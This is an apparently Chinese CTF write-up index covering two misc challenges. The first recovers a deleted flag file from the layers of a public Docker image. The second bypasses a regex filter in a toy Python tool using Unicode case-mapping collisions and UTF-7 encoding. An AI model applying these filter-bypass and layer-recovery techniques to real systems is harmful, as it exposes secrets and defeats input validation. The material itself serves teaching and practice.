\u7684\u64cd\u4f5c\u5728\u6700\u540e\u4e00\u5c42\uff0c\u662f\u76f8\u6bd4\u4e8e\u5012\u6570\u7b2c\u4e8c\u5c42\u7684\u5dee\u5f02\uff0c\u67e5\u770b\u5012\u6570\u7b2c\u4e00\u5c42\u7684 diff \u76ee\u5f55 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ docker history 8b8d3c8324c7/stringtool IMAGE CREATED CREATED BY SIZE COMMENT be6d023618d1 3 weeks ago /bin/sh -c #(nop) ENTRYPOINT [\"/bin/sh\" \"-c\u2026 0B # ENTRYPOINT \u4e0d\u521b\u5efa\u65b0\u5c42 <missing> 3 weeks ago /bin/sh -c rm /code/flag.txt 0B <missing> 3 weeks ago /bin/sh -c #(nop) COPY dir:c36852c2989cd5e8b\u2026 1.19kB <missing> 7 weeks ago /bin/sh -c #(nop) WORKDIR /code 0B <missing> 7 weeks ago /bin/sh -c mkdir /code 0B <missing> 7 weeks ago /bin/sh -c #(nop) ENV PYTHONUNBUFFERED=1 0B <missing> 7 weeks ago /bin/sh -c pip3 install pipenv 37 .5MB <missing> 7 weeks ago /bin/sh -c pip3 install bpython 5 .08MB <missing> 7 weeks ago /bin/sh -c pip3 install ipython 23 .8MB <missing> 7 weeks ago /bin/sh -c yum clean all 27 .9MB <missing> 7 weeks ago /bin/sh -c rm -rf /tmp/Python-3.7.3* 0B <missing> 7 weeks ago /bin/sh -c sed -i 's/python/python2/' /usr/b\u2026 802B <missing> 7 weeks ago /bin/sh -c pip install --upgrade pip 9 .55MB <missing> 7 weeks ago /bin/sh -c ln -s /usr/local/bin/pip3 /usr/bi\u2026 19B <missing> 7 weeks ago /bin/sh -c ln -s /usr/local/bin/python3 /usr\u2026 22B <missing> 7 weeks ago /bin/sh -c rm -f /usr/bin/python 0B <missing> 7 weeks ago /bin/sh -c make && make install 300MB <missing> 7 weeks ago /bin/sh -c /tmp/Python-3.7.3/configure 860kB <missing> 7 weeks ago /bin/sh -c tar -zxvf /tmp/Python-3.7.3.tgz -\u2026 79 .3MB <missing> 7 weeks ago /bin/sh -c wget -O /tmp/Python-3.7.3.tgz htt\u2026 23MB <missing> 7 weeks ago /bin/sh -c yum -y install mariadb-devel 103MB <missing> 7 weeks ago /bin/sh -c yum -y install vim 115MB <missing> 7 weeks ago /bin/sh -c yum -y install gcc 94 .8MB <missing> 7 weeks ago /bin/sh -c yum-builddep python -y 316MB <missing> 7 weeks ago /bin/sh -c yum -y install wget make yum-utils 92 .4MB <missing> 7 weeks ago /bin/sh -c #(nop) MAINTAINER Software_Engin\u2026 0B <missing> 3 months ago /bin/sh -c #(nop) CMD [\"/bin/bash\"] 0B <missing> 3 months ago /bin/sh -c #(nop) LABEL org.label-schema.sc\u2026 0B <missing> 3 months ago /bin/sh -c #(nop) ADD file:61908381d3142ffba\u2026 203MB LowerDir \u4e2d\u5217\u51fa\u7684\u5c42\u76ee\u5f55\u987a\u5e8f\u4e0e history \u5c55\u793a\u7684\u76f8\u540c\uff0c\u67e5\u770b\u76ee\u5f55\u5373\u53ef\u83b7\u5f97 Flag 1 2 3 4 5 6 7 8 9 10 $ tree /var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff /var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff \u2514\u2500\u2500 code \u251c\u2500\u2500 app.py \u251c\u2500\u2500 Dockerfile \u2514\u2500\u2500 flag.txt 1 directory, 3 files $ cat /var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff/code/flag.txt flag { Docker_Layers! = PS_Layers_hhh } \u53c2\u8003\u8d44\u6599 \u00b6 Best practices for writing Dockerfiles | Docker Documentation About storage drivers | Docker Documentation Use the OverlayFS storage driver | Docker Documentation docker save | Docker Documentation","title":"233 \u540c\u5b66\u7684 Docker"},{"location":"misc/233_docker/#_1","text":"233 \u540c\u5b66\u5728\u8f6f\u5de5\u8bfe\u4e0a\u5b66\u5230\u4e86 Docker \u8fd9\u79cd\u65b9\u4fbf\u7684\u4e1c\u897f\uff0c\u4e8e\u662f\u7ed9\u81ea\u5df1\u7684\u5b57\u7b26\u4e32\u5de5\u5177\u9879\u76ee\u5199\u4e86\u4e00\u4e2a Dockerfile\u3002 \u4f46\u662f 233 \u540c\u5b66\u7a81\u7136\u53d1\u73b0\u5b83\u4e0d\u5c0f\u5fc3\u628a\u4e00\u4e2a\u79c1\u5bc6\u6587\u4ef6\uff08flag.txt\uff09\u6253\u5305\u8fdb\u53bb\u4e86\uff0c\u4e8e\u662f\u5199\u4e86\u4e00\u884c\u547d\u4ee4\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6\u3002 \u300c\u65e2\u7136\u5df2\u7ecf\u5220\u6389\u4e86\uff0c\u5e94\u8be5\u4e0d\u4f1a\u88ab\u4eba\u627e\u51fa\u6765\u5427\uff1f\u300d233 \u60f3\u9053\u3002 Docker Hub \u5730\u5740\uff1a 8b8d3c8324c7/stringtool","title":"\u9898\u76ee"},{"location":"misc/233_docker/#_2","text":"Docker \u955c\u50cf\u7531\u4e00\u7cfb\u5217\u5c42\u7ec4\u6210\uff0c\u9664\u6700\u540e\u4e00\u5c42\uff0c\u5176\u4ed6\u90fd\u662f\u53ea\u8bfb\u5c42\uff0c\u6bcf\u4e00\u5c42\u4ee3\u8868\u4e00\u53e5 Dockerfile \u6307\u4ee4\uff0c\u8fd9\u4e9b\u5c42\u88ab\u5806\u53e0\u8d77\u6765\uff0c\u6bcf\u4e00\u5c42\u90fd\u662f\u4e0a\u4e00\u5c42\u53d8\u5316\u7684\u589e\u91cf \u53ea\u6709 RUN \u3001 COPY \u3001 ADD \u6307\u4ee4\u521b\u5efa\u65b0\u7684\u5c42\uff0c\u5176\u5b83\u6307\u4ee4\u53ea\u521b\u5efa\u4e34\u65f6\u4e2d\u95f4\u955c\u50cf\uff0c\u4e0d\u589e\u52a0\u6784\u5efa\u7684\u5927\u5c0f \u6bcf\u4e2a\u955c\u50cf\u5c42\u5728 /var/lib/docker/<storage-driver> \u4e0b\u90fd\u6709\u81ea\u5df1\u7684\u76ee\u5f55\uff0c\u5305\u542b\u955c\u50cf\u7684\u5185\u5bb9","title":"\u57fa\u7840\u77e5\u8bc6"},{"location":"misc/233_docker/#_3","text":"\u9898\u76ee\u4e2d\u63d0\u5230 \u4e8e\u662f\u5199\u4e86\u4e00\u884c\u547d\u4ee4\u5220\u6389\u8fd9\u4e2a\u6587\u4ef6 \uff0c\u4f7f\u7528\u7684\u5e94\u8be5\u662f\u5f62\u5982 RUN rm flag.txt \u7684\u547d\u4ee4\uff0c RUN \u6307\u4ee4\u4f1a\u521b\u5efa\u65b0\u7684\u5c42\uff0c\u800c\u975e\u4f7f\u7528\u4e34\u65f6\u4e2d\u95f4\u955c\u50cf\uff0c\u90a3\u4e48\u627e\u5230\u8fd9\u4e00\u5c42\uff0c\u5c31\u53ef\u4ee5\u627e\u5230 flag.txt \u83b7\u53d6\u5404\u5c42\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u955c\u50cf\u5c42\u4e3a lowerdir \uff0c diff \u76ee\u5f55\u4e0b\u5305\u542b\u8be5\u5c42\u7684\u5185\u5bb9 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 $ docker inspect 8b8d3c8324c7/stringtool [ { \"Id\" : \"sha256:be6d023618d199e0ec7448f70e5e47a00c6c2b79777ad5e2d312a6f74d6ad56b\" , \"RepoTags\" : [ \"8b8d3c8324c7/stringtool:latest\" ] , \"RepoDigests\" : [ \"8b8d3c8324c7/stringtool@sha256:aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152\" ] , \"Parent\" : \"\" , \"Comment\" : \"\" , \"Created\" : \"2020-10-16T12:51:09.221320098Z\" , \"Container\" : \"d2f452fddd5c71c8c57a29d67f29c69ffac419440d57664dad6e4ba1f0eff8a1\" , \"ContainerConfig\" : { ... } , \"DockerVersion\" : \"19.03.5\" , \"Author\" : \"Software_Engineering_Project\" , \"Config\" : { ... } , \"Architecture\" : \"amd64\" , \"Os\" : \"linux\" , \"Size\" : 1430524643 , \"VirtualSize\" : 1430524643 , \"GraphDriver\" : { \"Data\" : { \"LowerDir\" : \"/var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff: /var/lib/docker/overlay2/72c760a6faaf0c00299a0416d4a7d7892dbbe84c0d723e3cd026cf9bc23f2225/diff: /var/lib/docker/overlay2/9c29b0ec3156e99f41991b01534021a575347898c6836c8077f5516ffee138af/diff: /var/lib/docker/overlay2/a8721c9f92017818f0bfb114966aa0b84b543cfbefe359cfb5fd733df7e25431/diff: /var/lib/docker/overlay2/ebfbfcd1df60c25be45dd84de29f38b15f39825ce5f231492a85cd857f08af31/diff: /var/lib/docker/overlay2/bf646619d7607fb28d5deec60b2e340a612add9825590f34a23e8205c5d209f6/diff: /var/lib/docker/overlay2/31943f86d1bbe26181f3bef8f3ae1de40f2650458ad373a8a2a71f5234d61890/diff: /var/lib/docker/overlay2/29d9434b310f8c5a17746f7c8a5d56e84c631696794e752fb2e19ab2112d1534/diff: /var/lib/docker/overlay2/ea91dc145974b3159822f833367282a6cff5bc4fed614146b07e931795679298/diff: /var/lib/docker/overlay2/f3eb4d3cf03440fded8f1bf09c8e797472471fcacbe25217b7ce7f9ffab3f309/diff: /var/lib/docker/overlay2/d47b622e362e0bbbd442de5608ef290f62e7a828c3c49ef4897c2bd6bc53cddf/diff: /var/lib/docker/overlay2/edef4c3786d7fd34d6edc434c22b8d0650f640a2c1c06a0171e424302cc4b756/diff: /var/lib/docker/overlay2/a9812c2890727e60f709b917d69845dd39c8bddff28651e617b35dbba0684efe/diff: /var/lib/docker/overlay2/56ae36174f5ac0f1219fb9d05125d76cc418050d191de2c11710ec4045c38717/diff: /var/lib/docker/overlay2/af2fc9999b37a6e0ac6aad23e8a7d3ecda2696afa36a5cf31056e37f8e416ad4/diff: /var/lib/docker/overlay2/6711b59d1f347f930e92df00f5a684eca8eedce1ced9df984ccbd2232e45bb30/diff: /var/lib/docker/overlay2/24373e7f69c254b21c3b16128e6055ba09a58acb8bc08cc9273c0d745dc1cc0c/diff: /var/lib/docker/overlay2/8261fbe516dac64a01f9e5d213bcd42dca12e8cfb1f95a530497511a21b328f3/diff: /var/lib/docker/overlay2/ce4ad073872a2365e6f364031d121b0aa174fefa565a7c7904300f638d9cf3a9/diff: /var/lib/docker/overlay2/4db84c7954a7906e803b5e2bae2d0e8c3dcb7ad39f3d27822bd6bee6d42954a1/diff: /var/lib/docker/overlay2/e99c01108bb370642151fbdc8209bc70c8871604a5efd2a6b9005c29160b03fe/diff: /var/lib/docker/overlay2/bbe523d8bff045d3c6db194ded9773912a2a527564724c9c27393cdb47d94754/diff\" , \"MergedDir\" : \"/var/lib/docker/overlay2/66b4f69b33d469a3d81a2fa03e1e621b8de2b9ed4ba8a756279c2d3a0a39fa7e/merged\" , \"UpperDir\" : \"/var/lib/docker/overlay2/66b4f69b33d469a3d81a2fa03e1e621b8de2b9ed4ba8a756279c2d3a0a39fa7e/diff\" , \"WorkDir\" : \"/var/lib/docker/overlay2/66b4f69b33d469a3d81a2fa03e1e621b8de2b9ed4ba8a756279c2d3a0a39fa7e/work\" } , \"Name\" : \"overlay2\" } , \"RootFS\" : { \"Type\" : \"layers\" , \"Layers\" : [ \"sha256:613be09ab3c0860a5216936f412f09927947012f86bfa89b263dfa087a725f81\" , ... \"sha256:ce2f773d43eee87d53a828fbcd2daa8e6ae3f0490fbaf616a8aba752839072ff\" ] } , \"Metadata\" : { \"LastTagTime\" : \"0001-01-01T00:00:00Z\" } } ] \u901a\u8fc7 history \u67e5\u770b\u5404\u5c42\u7684\u6307\u4ee4\uff0c\u5220\u9664 flag.txt \u7684\u64cd\u4f5c\u5728\u6700\u540e\u4e00\u5c42\uff0c\u662f\u76f8\u6bd4\u4e8e\u5012\u6570\u7b2c\u4e8c\u5c42\u7684\u5dee\u5f02\uff0c\u67e5\u770b\u5012\u6570\u7b2c\u4e00\u5c42\u7684 diff \u76ee\u5f55 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 $ docker history 8b8d3c8324c7/stringtool IMAGE CREATED CREATED BY SIZE COMMENT be6d023618d1 3 weeks ago /bin/sh -c #(nop) ENTRYPOINT [\"/bin/sh\" \"-c\u2026 0B # ENTRYPOINT \u4e0d\u521b\u5efa\u65b0\u5c42 <missing> 3 weeks ago /bin/sh -c rm /code/flag.txt 0B <missing> 3 weeks ago /bin/sh -c #(nop) COPY dir:c36852c2989cd5e8b\u2026 1.19kB <missing> 7 weeks ago /bin/sh -c #(nop) WORKDIR /code 0B <missing> 7 weeks ago /bin/sh -c mkdir /code 0B <missing> 7 weeks ago /bin/sh -c #(nop) ENV PYTHONUNBUFFERED=1 0B <missing> 7 weeks ago /bin/sh -c pip3 install pipenv 37 .5MB <missing> 7 weeks ago /bin/sh -c pip3 install bpython 5 .08MB <missing> 7 weeks ago /bin/sh -c pip3 install ipython 23 .8MB <missing> 7 weeks ago /bin/sh -c yum clean all 27 .9MB <missing> 7 weeks ago /bin/sh -c rm -rf /tmp/Python-3.7.3* 0B <missing> 7 weeks ago /bin/sh -c sed -i 's/python/python2/' /usr/b\u2026 802B <missing> 7 weeks ago /bin/sh -c pip install --upgrade pip 9 .55MB <missing> 7 weeks ago /bin/sh -c ln -s /usr/local/bin/pip3 /usr/bi\u2026 19B <missing> 7 weeks ago /bin/sh -c ln -s /usr/local/bin/python3 /usr\u2026 22B <missing> 7 weeks ago /bin/sh -c rm -f /usr/bin/python 0B <missing> 7 weeks ago /bin/sh -c make && make install 300MB <missing> 7 weeks ago /bin/sh -c /tmp/Python-3.7.3/configure 860kB <missing> 7 weeks ago /bin/sh -c tar -zxvf /tmp/Python-3.7.3.tgz -\u2026 79 .3MB <missing> 7 weeks ago /bin/sh -c wget -O /tmp/Python-3.7.3.tgz htt\u2026 23MB <missing> 7 weeks ago /bin/sh -c yum -y install mariadb-devel 103MB <missing> 7 weeks ago /bin/sh -c yum -y install vim 115MB <missing> 7 weeks ago /bin/sh -c yum -y install gcc 94 .8MB <missing> 7 weeks ago /bin/sh -c yum-builddep python -y 316MB <missing> 7 weeks ago /bin/sh -c yum -y install wget make yum-utils 92 .4MB <missing> 7 weeks ago /bin/sh -c #(nop) MAINTAINER Software_Engin\u2026 0B <missing> 3 months ago /bin/sh -c #(nop) CMD [\"/bin/bash\"] 0B <missing> 3 months ago /bin/sh -c #(nop) LABEL org.label-schema.sc\u2026 0B <missing> 3 months ago /bin/sh -c #(nop) ADD file:61908381d3142ffba\u2026 203MB LowerDir \u4e2d\u5217\u51fa\u7684\u5c42\u76ee\u5f55\u987a\u5e8f\u4e0e history \u5c55\u793a\u7684\u76f8\u540c\uff0c\u67e5\u770b\u76ee\u5f55\u5373\u53ef\u83b7\u5f97 Flag 1 2 3 4 5 6 7 8 9 10 $ tree /var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff /var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff \u2514\u2500\u2500 code \u251c\u2500\u2500 app.py \u251c\u2500\u2500 Dockerfile \u2514\u2500\u2500 flag.txt 1 directory, 3 files $ cat /var/lib/docker/overlay2/6edccc4d6d8f057b4b42b8f448b9bbbd4809be182e9fa263ac4a486a08f0bedd/diff/code/flag.txt flag { Docker_Layers! = PS_Layers_hhh }","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/233_docker/#_4","text":"Best practices for writing Dockerfiles | Docker Documentation About storage drivers | Docker Documentation Use the OverlayFS storage driver | Docker Documentation docker save | Docker Documentation","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/233_string_tool/","text":"\u9898\u76ee \u00b6 233 \u540c\u5b66\u6700\u8fd1\u521a\u521a\u5b66\u4f1a\u4e86 Python \u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\uff0c\u4e8e\u662f\u5199\u4e86\u4e24\u4e2a\u5c0f\u7a0b\u5e8f\u8fd0\u884c\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u3002\u8fd9\u4e2a\u5de5\u5177\u63d0\u4f9b\u4e24\u4e2a\u529f\u80fd\uff1a \u5b57\u7b26\u4e32\u5927\u5199\u5de5\u5177 UTF-7 \u5230 UTF-8 \u8f6c\u6362\u5de5\u5177 233 \u540c\u5b66\u7684\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import re def to_upper ( s ): r = re . compile ( '[fF][lL][aA][gG]' ) if r . match ( s ): print ( 'how dare you' ) elif s . upper () == 'FLAG' : print ( 'yes, I will give you the flag' ) print ( open ( '/flag1' ) . read ()) else : print ( ' %s ' % s . upper ()) def to_utf8 ( s ): r = re . compile ( '[fF][lL][aA][gG]' ) s = s . encode () # make it bytes if r . match ( s . decode ()): print ( 'how dare you' ) elif s . decode ( 'utf-7' ) == 'flag' : print ( 'yes, I will give you the flag' ) print ( open ( '/flag2' ) . read ()) else : print ( ' %s ' % s . decode ( 'utf-7' )) def main (): print ( 'Welcome to the best string tool here!' ) print ( 'Brought to you by 233 PROUDLY' ) print ( '' ) print ( 'Which tool do you want?' ) print ( '1. Convert my string to UPPERCASE!!' ) print ( '2. Convert my UTF-7 string to UTF-8!!' ) choice = input () if choice [ 0 ] == '1' : print ( 'Welcome to the capitalizer tool, please input your string: ' ) to_upper ( input ()) elif choice [ 0 ] == '2' : print ( 'Welcome to the UTF-7->UTF-8 tool, please input your string: ' ) to_utf8 ( input ()) else : print ( 'I am confused, madam' ) main () \u8bfb\u4e86\u4ee3\u7801\u4e4b\u540e\uff0c\u4f60\u60ca\u8bb6\u5730\u53d1\u73b0\u81ea\u5df1\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u8f93\u5165\uff0c\u4f7f\u5f97 233 \u540c\u5b66\u7684\u5de5\u5177\u8fd4\u56de flag\u3002 \u89e3\u9898\u601d\u8def \u00b6 \u5b57\u7b26\u4e32\u5927\u5199\u5de5\u5177 \u00b6 \u5bf9\u4e8e Unicode \u6765\u8bf4\uff0c\u5927\u5c0f\u5199\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e00\u4e00\u5bf9\u5e94\u7684 - Myths of Unicode \u5176\u4e2d\u6709\u4e00\u4e2a\u5b57\u7b26 \ufb02 \u8f6c\u6362\u6210\u5927\u5199\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 FL \u5982\u679c\u731c\u5230\u7ecf\u8fc7 upper() \u4f1a\u5c06\u4e00\u4e2a\u5b57\u7b26\u53d8\u6210\u4e24\u4e2a\u5b57\u7b26\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7a0b\u5e8f\u67e5\u627e\u8fd9\u4e2a\u5b57\u7b26 1 2 3 4 for i in range ( 0 , 65535 ): if chr ( i ) . upper () == 'FL' or chr ( i ) . upper () == 'LA' or chr ( i ) . upper () == 'AG' : print ( chr ( i )) break \u7531\u6b64\u53ef\u83b7\u5f97\u7b2c\u4e00\u4e2a Flag \u5927\u5c0f\u5199\u8f6c\u6362\u7279\u4f8b \u00b6 \u6765\u6e90\uff1a Wisdom/Awesome-Unicode: A curated list of delightful Unicode tidbits, packages and resources. Uppercase Transformation Collisions Char Code Point Output Char \u00df 0x00DF SS \u0131 0x0131 I \u017f 0x017F S \ufb00 0xFB00 FF \ufb01 0xFB01 FI \ufb02 0xFB02 FL \ufb03 0xFB03 FFI \ufb04 0xFB04 FFL \ufb05 0xFB05 ST \ufb06 0xFB06 ST Lowercase Transformation Collisions Char Code Point Output Char \u212a 0x212A k UTF-7 \u5230 UTF-8 \u8f6c\u6362\u5de5\u5177 \u00b6 \u5c06 flag \u7684 Unicode \u6570\u503c\uff08UTF-16\uff09\u7528\u4e8c\u8fdb\u5236\u8868\u793a 1 2 3 4 f: 0000 0000 \u202d0110 0110\u202c l: 0000 0000 \u202d\u202d0110 1100\u202c a: 0000 0000 \u202d\u202d0110 0001\u202c g: 0000 0000 \u202d\u202d0110 0111\u202c \u5408\u5e76\u540e\u4ece\u5de6\u4ee5\u516d\u4f4d\u6570\u4e3a\u4e00\u7ec4\u91cd\u65b0\u7f16\u7ec4\uff0c\u4e0d\u8db3\u516d\u4f4d\u7684\u7528 0 \u8865\u5c3e 1 000000 00\u202d0110 0110\u202c00 000000 \u202d\u202d011011 00\u202c0000 0000\u202d01 100001\u202c 000000 000110 0111\u202c00 \u5c06\u6bcf\u4e00\u7ec4\u516d\u4f4d\u6570\u7684\u6570\u503c\u4ee5\u5bf9\u5e94\u7684 Base64 \u7801\u53d6\u4ee3\uff1a AGYAbABhAGc \u4f7f\u7528 + \u6807\u8bc6\u5f00\u5934\uff0c\u7ed3\u5c3e\u4ee5\u4efb\u4f55\u4e0d\u5728 Base64 \u91cc\u5b9a\u4e49\u7684\u5b57\u7b26\u6765\u6807\u8bc6\u3002\u82e5\u5728 Base64 \u533a\u5757\u4e4b\u540e\u4f7f\u7528 - \u4f5c\u4e3a\u7ed3\u5c3e\u6807\u8bc6\uff0c\u5219\u89e3\u7801\u5668\u4f1a\u4ece\u4e0b\u4e2a\u5b57\u7b26\u7ee7\u7eed\u89e3\u7801\uff0c\u53cd\u4e4b\u5219\u4ee5\u6b64\u5b57\u7b26\u4f5c\u4e3a\u975e Base64 \u7684\u533a\u5757\u5f00\u5934\u7ee7\u7eed\u89e3\u7801 UTF-8 Everywhere \u53c2\u8003\u8d44\u6599 \u00b6 UTF-7 - Wikipedia Base64 - Wikipedia","title":"233 \u540c\u5b66\u7684\u5b57\u7b26\u4e32\u5de5\u5177"},{"location":"misc/233_string_tool/#_1","text":"233 \u540c\u5b66\u6700\u8fd1\u521a\u521a\u5b66\u4f1a\u4e86 Python \u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\uff0c\u4e8e\u662f\u5199\u4e86\u4e24\u4e2a\u5c0f\u7a0b\u5e8f\u8fd0\u884c\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u3002\u8fd9\u4e2a\u5de5\u5177\u63d0\u4f9b\u4e24\u4e2a\u529f\u80fd\uff1a \u5b57\u7b26\u4e32\u5927\u5199\u5de5\u5177 UTF-7 \u5230 UTF-8 \u8f6c\u6362\u5de5\u5177 233 \u540c\u5b66\u7684\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import re def to_upper ( s ): r = re . compile ( '[fF][lL][aA][gG]' ) if r . match ( s ): print ( 'how dare you' ) elif s . upper () == 'FLAG' : print ( 'yes, I will give you the flag' ) print ( open ( '/flag1' ) . read ()) else : print ( ' %s ' % s . upper ()) def to_utf8 ( s ): r = re . compile ( '[fF][lL][aA][gG]' ) s = s . encode () # make it bytes if r . match ( s . decode ()): print ( 'how dare you' ) elif s . decode ( 'utf-7' ) == 'flag' : print ( 'yes, I will give you the flag' ) print ( open ( '/flag2' ) . read ()) else : print ( ' %s ' % s . decode ( 'utf-7' )) def main (): print ( 'Welcome to the best string tool here!' ) print ( 'Brought to you by 233 PROUDLY' ) print ( '' ) print ( 'Which tool do you want?' ) print ( '1. Convert my string to UPPERCASE!!' ) print ( '2. Convert my UTF-7 string to UTF-8!!' ) choice = input () if choice [ 0 ] == '1' : print ( 'Welcome to the capitalizer tool, please input your string: ' ) to_upper ( input ()) elif choice [ 0 ] == '2' : print ( 'Welcome to the UTF-7->UTF-8 tool, please input your string: ' ) to_utf8 ( input ()) else : print ( 'I am confused, madam' ) main () \u8bfb\u4e86\u4ee3\u7801\u4e4b\u540e\uff0c\u4f60\u60ca\u8bb6\u5730\u53d1\u73b0\u81ea\u5df1\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u8f93\u5165\uff0c\u4f7f\u5f97 233 \u540c\u5b66\u7684\u5de5\u5177\u8fd4\u56de flag\u3002","title":"\u9898\u76ee"},{"location":"misc/233_string_tool/#_2","text":"","title":"\u89e3\u9898\u601d\u8def"},{"location":"misc/233_string_tool/#_3","text":"\u5bf9\u4e8e Unicode \u6765\u8bf4\uff0c\u5927\u5c0f\u5199\u5e76\u4e0d\u4e00\u5b9a\u662f\u4e00\u4e00\u5bf9\u5e94\u7684 - Myths of Unicode \u5176\u4e2d\u6709\u4e00\u4e2a\u5b57\u7b26 \ufb02 \u8f6c\u6362\u6210\u5927\u5199\u540e\u5c31\u53ef\u4ee5\u5f97\u5230 FL \u5982\u679c\u731c\u5230\u7ecf\u8fc7 upper() \u4f1a\u5c06\u4e00\u4e2a\u5b57\u7b26\u53d8\u6210\u4e24\u4e2a\u5b57\u7b26\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7a0b\u5e8f\u67e5\u627e\u8fd9\u4e2a\u5b57\u7b26 1 2 3 4 for i in range ( 0 , 65535 ): if chr ( i ) . upper () == 'FL' or chr ( i ) . upper () == 'LA' or chr ( i ) . upper () == 'AG' : print ( chr ( i )) break \u7531\u6b64\u53ef\u83b7\u5f97\u7b2c\u4e00\u4e2a Flag","title":"\u5b57\u7b26\u4e32\u5927\u5199\u5de5\u5177"},{"location":"misc/233_string_tool/#_4","text":"\u6765\u6e90\uff1a Wisdom/Awesome-Unicode: A curated list of delightful Unicode tidbits, packages and resources. Uppercase Transformation Collisions Char Code Point Output Char \u00df 0x00DF SS \u0131 0x0131 I \u017f 0x017F S \ufb00 0xFB00 FF \ufb01 0xFB01 FI \ufb02 0xFB02 FL \ufb03 0xFB03 FFI \ufb04 0xFB04 FFL \ufb05 0xFB05 ST \ufb06 0xFB06 ST Lowercase Transformation Collisions Char Code Point Output Char \u212a 0x212A k","title":"\u5927\u5c0f\u5199\u8f6c\u6362\u7279\u4f8b"},{"location":"misc/233_string_tool/#utf-7-utf-8","text":"\u5c06 flag \u7684 Unicode \u6570\u503c\uff08UTF-16\uff09\u7528\u4e8c\u8fdb\u5236\u8868\u793a 1 2 3 4 f: 0000 0000 \u202d0110 0110\u202c l: 0000 0000 \u202d\u202d0110 1100\u202c a: 0000 0000 \u202d\u202d0110 0001\u202c g: 0000 0000 \u202d\u202d0110 0111\u202c \u5408\u5e76\u540e\u4ece\u5de6\u4ee5\u516d\u4f4d\u6570\u4e3a\u4e00\u7ec4\u91cd\u65b0\u7f16\u7ec4\uff0c\u4e0d\u8db3\u516d\u4f4d\u7684\u7528 0 \u8865\u5c3e 1 000000 00\u202d0110 0110\u202c00 000000 \u202d\u202d011011 00\u202c0000 0000\u202d01 100001\u202c 000000 000110 0111\u202c00 \u5c06\u6bcf\u4e00\u7ec4\u516d\u4f4d\u6570\u7684\u6570\u503c\u4ee5\u5bf9\u5e94\u7684 Base64 \u7801\u53d6\u4ee3\uff1a AGYAbABhAGc \u4f7f\u7528 + \u6807\u8bc6\u5f00\u5934\uff0c\u7ed3\u5c3e\u4ee5\u4efb\u4f55\u4e0d\u5728 Base64 \u91cc\u5b9a\u4e49\u7684\u5b57\u7b26\u6765\u6807\u8bc6\u3002\u82e5\u5728 Base64 \u533a\u5757\u4e4b\u540e\u4f7f\u7528 - \u4f5c\u4e3a\u7ed3\u5c3e\u6807\u8bc6\uff0c\u5219\u89e3\u7801\u5668\u4f1a\u4ece\u4e0b\u4e2a\u5b57\u7b26\u7ee7\u7eed\u89e3\u7801\uff0c\u53cd\u4e4b\u5219\u4ee5\u6b64\u5b57\u7b26\u4f5c\u4e3a\u975e Base64 \u7684\u533a\u5757\u5f00\u5934\u7ee7\u7eed\u89e3\u7801 UTF-8 Everywhere","title":"UTF-7 \u5230 UTF-8 \u8f6c\u6362\u5de5\u5177"},{"location":"misc/233_string_tool/#_5","text":"UTF-7 - Wikipedia Base64 - Wikipedia","title":"\u53c2\u8003\u8d44\u6599"},{"location":"misc/4f_system_middle/","text":"\u9898\u76ee \u00b6 \u5c0f P \u5728\u4e00\u6559\u505a \u5085\u91cc\u53f6\u5149\u5b66 \u5b9e\u9a8c\u65f6\uff0c\u5728\u5b9e\u9a8c\u5ba4\u7535\u8111\u7684\u6a21\u62df\u7a0b\u5e8f\u91cc\u53d1\u73b0\u4e86\u8fd9\u4e48\u4e00\u5f20\u7684\u56fe\u7247\uff1a \u6570\u7406\u57fa\u7840\u5e76\u4e0d\u624e\u5b9e\u7684\u5c0f P \u5e76\u4e0d\u77e5\u9053\u4ec0\u4e48\u4e1c\u897f\u6210\u50cf\u4f1a\u662f\u8fd9\u4e2a\u6837\u5b50\uff1a\u53c8\u6216\u8bb8\u4ec0\u4e48\u4e1c\u897f\u90fd\u4e0d\u662f\uff0c\u6bd5\u7adf\u8fd9\u53ea\u662f\u6a21\u62df ... 